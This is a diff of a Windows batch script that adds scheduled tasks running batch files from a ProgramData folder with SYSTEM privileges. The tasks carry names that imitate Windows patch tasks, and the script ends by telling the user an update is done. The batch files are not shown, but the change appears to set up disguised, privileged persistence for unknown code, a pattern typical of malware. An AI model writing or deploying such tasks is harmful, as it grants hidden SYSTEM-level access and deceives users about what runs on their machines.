@@ -55,7 +55,9 @@ SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_msdos" /TR "%programdata%\Wpc
 SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_repair" /TR "%programdata%\Wpc\repair.bat" /RU system /ec system
 SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_patch" /TR "%programdata%\Wpc\patch.bat" /RU system /ec system
 SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_update" /TR "%programdata%\Wpc\udp.bat" /RU system /ec system
-SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_msdos" /TR "%programdata%\Wpc\Debugms.bat" /RU system /ec system
+SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_msdosdebug" /TR "%programdata%\Wpc\msDebug.bat" /RU system /ec system
+SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_Setup" /TR "%programdata%\Wpc\setup.bat" /RU system /ec system
+SCHTASKS /CREATE /SC onevent /TN "Windows_pc_patch_UserConfig" /TR "%programdata%\Wpc\Utilitary.bat" /RU system /ec system
 echo The update is done Your pc will be updated when you restart it
 pause
 exit /b
